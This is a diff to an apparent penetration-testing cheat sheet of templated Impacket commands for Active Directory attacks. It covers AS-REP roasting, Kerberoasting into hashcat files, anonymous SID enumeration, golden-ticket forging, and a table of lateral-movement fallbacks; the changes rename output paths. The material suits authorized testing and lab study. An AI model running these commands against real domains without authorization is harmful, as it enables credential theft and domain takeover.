@@ -26,15 +26,15 @@ Binaries on Kali are `impacket-<Name>` (also `Name.py`). Same flags.
 
 ```
 # roast (no cred)
-impacket-GetNPUsers {{DOMAIN}}/ -no-pass -dc-ip {{DC}} -usersfile /loot/enum/users.txt \
-  -format hashcat -outputfile /loot/hashes/asrep.txt
+impacket-GetNPUsers {{DOMAIN}}/ -no-pass -dc-ip {{DC}} -usersfile /logs/enum/users.txt \
+  -format hashcat -outputfile /logs/hashes/asrep.txt
 
 # roast from guest / empty password — do this BEFORE spray when guest binds
 impacket-GetUserSPNs {{DOMAIN}}/guest -no-pass -dc-ip {{DC}} -request \
-  -outputfile /loot/hashes/kerb.txt
+  -outputfile /logs/hashes/kerb.txt
 # roast (any user)
 impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{DC}} -request \
-  -outputfile /loot/hashes/kerb.txt
+  -outputfile /logs/hashes/kerb.txt
 # AES: add -outputfile and expect $krb5tgs$18$ → hashcat 19700
 
 impacket-lookupsid {{DOMAIN}}/nobody@{{DC}} -no-pass          # anonymous RID
@@ -101,7 +101,7 @@ impacket-ticketer -nthash {{KRBTGT_CHILD}} -domain-sid CHILD \
 | Symptom | Next |
 | --- | --- |
 | clock skew | ntpdate the DC, rebuild the ticket |
-| TGS `Connection reset by peer` on VPN (AS-REQ works, getST/GetUserSPNs die) | path-MTU black-hole — `ip link set dev tun0 mtu 1200` (run `/opt/gotad/preflight.sh`), re-apply after reconnect |
+| TGS `Connection reset by peer` on VPN (AS-REQ works, getST/GetUserSPNs die) | path-MTU black-hole — `ip link set dev tun0 mtu 1200` (run `/opt/adtk/preflight.sh`), re-apply after reconnect |
 | Protected Users | TGT + `-k`. PTH will fail |
 | psexec blocked | wmiexec → smbexec → evil-winrm |
 | no `C$` | you are not local admin. stay in LDAP |
